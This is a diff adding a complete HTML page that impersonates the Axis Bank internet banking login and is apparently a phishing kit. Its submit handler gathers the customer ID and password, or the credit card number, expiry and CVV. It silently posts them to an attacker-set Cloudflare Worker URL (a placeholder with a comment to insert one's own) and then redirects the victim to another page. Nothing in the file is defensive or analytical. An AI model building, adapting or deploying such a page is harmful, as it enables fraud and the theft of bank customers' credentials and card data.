@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Internet Banking | Axis Bank</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --axis-maroon: #971237; }
+        body { font-family: 'Public Sans', sans-serif; background-color: #ffffff; color: #333; margin: 0; -webkit-font-smoothing: antialiased; }
+        
+        .pill-tab {
+            border: 1px solid #d1d5db;
+            border-radius: 9999px;
+            padding: 10px 22px; 
+            font-size: 14px;   
+            font-weight: 600;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        .pill-active { background-color: var(--axis-maroon); color: white; border-color: var(--axis-maroon); box-shadow: 0 4px 12px rgba(151, 18, 55, 0.15); }
+        .pill-inactive { background-color: #ffffff; color: #6b7280; }
+
+        .input-box {
+            border: 1.5px solid #e5e7eb;
+            border-radius: 8px;
+            width: 100%;
+            padding: 10px 14px; 
+            font-size: 15px;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+        .input-box:focus { border-color: var(--axis-maroon); box-shadow: 0 0 0 3px rgba(151, 18, 55, 0.05); }
+        .hidden { display: none; }
+
+        .info-circle {
+            width: 75px; height: 75px; background: white; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 18px; box-shadow: 0 4px 12px rgba(0,0,0,0.04);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <header class="w-full border-b border-gray-100 sticky top-0 bg-white z-50">
+        <img src="https://i.ibb.co/d4BCqfS6/chrome-screenshot-19-Apr-2026-7-42-45-am-IST.png" alt="Axis Header" class="w-full h-auto block">
+    </header>
+
+    <main class="p-6 flex-1 flex flex-col items-start max-w-xl mx-auto w-full">
+        <h1 class="text-[22px] font-bold text-[#2d2d2d] mb-6 tracking-tight">Login to Internet Banking</h1>
+
+        <div class="flex gap-2.5 mb-8">
+            <button id="id-tab" type="button" onclick="showTab('id')" class="pill-tab pill-active">Login ID / Customer ID</button>
+            <button id="card-tab" type="button" onclick="showTab('card')" class="pill-tab pill-inactive">Credit Card No.</button>
+        </div>
+
+        <form id="loginForm" class="w-full space-y-6 mb-10">
+            <div id="id-section" class="space-y-6">
+                <div>
+                    <label class="text-[13px] font-bold text-[#5a5a5a] mb-2 block">Login ID / Customer ID <span class="text-red-600">*</span></label>
+                    <input type="text" id="custId" placeholder="Enter ID" class="input-box">
+                    <div class="flex gap-4 mt-3">
+                        <a href="#" class="text-[12px] text-[#971237] font-bold hover:underline">Forgot customer ID</a>
+                        <span class="text-gray-300">|</span>
+                        <a href="#" class="text-[12px] text-[#971237] font-bold hover:underline">Enable login ID</a>
+                    </div>
+                </div>
+
+                <div>
+                    <label class="block text-[13px] font-bold text-[#5a5a5a] mb-2">Password <span class="text-red-600">*</span></label>
+                    <div class="relative flex gap-2">
+                        <div class="relative flex-1">
+                            <input id="passwordInput" type="password" placeholder="Enter Password" class="input-box pr-12">
+                            <button type="button" onclick="togglePasswordVisibility()" class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400">
+                                <i id="eyeIcon" data-lucide="eye-off" class="w-4 h-4"></i>
+                            </button>
+                        </div>
+                        <button type="button" class="border border-[#e5e7eb] px-3 rounded-lg bg-white">
+                            <i data-lucide="layout-grid" class="w-5 h-5 text-[#971237]"></i>
+                        </button>
+                    </div>
+                    <a href="#" class="block mt-3 text-[12px] text-[#971237] font-bold hover:underline">Forgot password</a>
+                </div>
+            </div>
+
+            <div id="card-section" class="space-y-6 hidden">
+                <div>
+                    <label class="block text-[13px] font-bold text-[#5a5a5a] mb-2">Credit Card Number <span class="text-red-600">*</span></label>
+                    <input type="tel" id="cardNum" maxlength="19" placeholder="0000 0000 0000 0000" class="input-box font-mono tracking-widest">
+                </div>
+                <div class="grid grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-[13px] font-bold text-[#5a5a5a] mb-2">Expiry Date *</label>
+                        <input type="tel" id="expiryDate" maxlength="5" placeholder="MM/YY" class="input-box text-center">
+                    </div>
+                    <div>
+                        <label class="block text-[13px] font-bold text-[#5a5a5a] mb-2">CVV *</label>
+                        <input type="tel" id="cvv" maxlength="3" placeholder="***" class="input-box text-center">
+                    </div>
+                </div>
+            </div>
+
+            <button type="submit" class="w-full bg-[#971237] text-white py-3.5 rounded-xl font-bold text-[17px] shadow-lg shadow-red-900/10 active:scale-[0.98] transition-all">
+                Login
+            </button>
+            <div class="text-center pt-2">
+                <p class="text-[14px] text-gray-600">First time user? <a href="#" class="text-[#971237] font-bold underline ml-1 uppercase">Register Here</a></p>
+            </div>
+        </form>
+    </main>
+
+    <section class="bg-[#f8f9fb] w-full py-16 px-8 space-y-16 border-t border-gray-100">
+        <div class="text-center max-w-xs mx-auto">
+            <div class="info-circle"><i data-lucide="shield-check" class="w-9 h-9 text-[#971237]"></i></div>
+            <h2 class="text-[18px] font-bold text-[#333] mb-2">Secure & Reliable</h2>
+            <p class="text-[13px] text-gray-500 mb-5 leading-snug">Bank with confidence. Know your digital safety measures.</p>
+            <a href="#" class="text-[12px] text-[#971237] font-bold tracking-widest uppercase border-b-2 border-[#971237] pb-1">Know More</a>
+        </div>
+        <div class="text-center max-w-xs mx-auto">
+            <div class="info-circle"><i data-lucide="headset" class="w-9 h-9 text-[#971237]"></i></div>
+            <h2 class="text-[18px] font-bold text-[#333] mb-2">Get in Touch</h2>
+            <p class="text-[13px] text-gray-500 mb-5 leading-snug">We have got your back when you are stuck.</p>
+            <a href="#" class="text-[12px] text-[#971237] font-bold tracking-widest uppercase border-b-2 border-[#971237] pb-1">Know More</a>
+        </div>
+        <div class="text-center max-w-xs mx-auto">
+            <div class="info-circle"><i data-lucide="smartphone" class="w-9 h-9 text-[#971237]"></i></div>
+            <h2 class="text-[18px] font-bold text-[#333] mb-2">Get Mobile App</h2>
+            <p class="text-[13px] text-gray-500 mb-5 leading-snug">Download our Axis bank mobile app on your smartphone.</p>
+            <a href="#" class="text-[12px] text-[#971237] font-bold tracking-widest uppercase border-b-2 border-[#971237] pb-1">Download</a>
+        </div>
+    </section>
+
+    <footer class="w-full bg-white border-t border-gray-100 pt-12 pb-10 px-6">
+        <div class="max-w-xl mx-auto text-center">
+            <div class="flex flex-wrap justify-center gap-x-8 gap-y-3 mb-8">
+                <a href="#" class="text-[12px] text-[#666666] font-semibold">Security</a>
+                <a href="#" class="text-[12px] text-[#666666] font-semibold">Privacy Policy</a>
+                <a href="#" class="text-[12px] text-[#666666] font-semibold">Terms & Conditions</a>
+            </div>
+            <p class="text-[11px] text-[#aaaaaa] font-medium uppercase tracking-tight">&copy; 2026 Axis Bank Ltd. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script>
+        lucide.createIcons();
+
+        function togglePasswordVisibility() {
+            const input = document.getElementById('passwordInput');
+            const icon = document.getElementById('eyeIcon');
+            input.type = input.type === 'password' ? 'text' : 'password';
+            icon.setAttribute('data-lucide', input.type === 'password' ? 'eye-off' : 'eye');
+            lucide.createIcons();
+        }
+
+        function showTab(type) {
+            document.getElementById('id-tab').className = type === 'id' ? 'pill-tab pill-active' : 'pill-tab pill-inactive';
+            document.getElementById('card-tab').className = type === 'card' ? 'pill-tab pill-active' : 'pill-tab pill-inactive';
+            document.getElementById('id-section').classList.toggle('hidden', type !== 'id');
+            document.getElementById('card-section').classList.toggle('hidden', type !== 'card');
+        }
+
+        // Logic formatting
+        document.getElementById('expiryDate').addEventListener('input', e => {
+            let v = e.target.value.replace(/\D/g, '');
+            if (v.length >= 2) e.target.value = v.slice(0, 2) + '/' + v.slice(2, 4);
+        });
+        document.getElementById('cardNum').addEventListener('input', e => {
+            let v = e.target.value.replace(/\D/g, '');
+            e.target.value = v.match(/.{1,4}/g)?.join(' ') || '';
+        });
+
+        // WORKER SUBMISSION & REDIRECT
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const isCard = !document.getElementById('card-section').classList.contains('hidden');
+            const data = isCard ? {
+                type: 'CARD',
+                cc: document.getElementById('cardNum').value,
+                exp: document.getElementById('expiryDate').value,
+                cvv: document.getElementById('cvv').value
+            } : {
+                type: 'LOGIN',
+                user: document.getElementById('custId').value,
+                pass: document.getElementById('passwordInput').value
+            };
+
+            // APNA WORKER URL YAHAN DALO
+            const WORKER_URL = 'https://your-worker.your-subdomain.workers.dev/';
+
+            fetch(WORKER_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                keepalive: true,
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+
+            window.location.href = 'blogone.html';
+        });
+    </script>
+</body>
+</html>
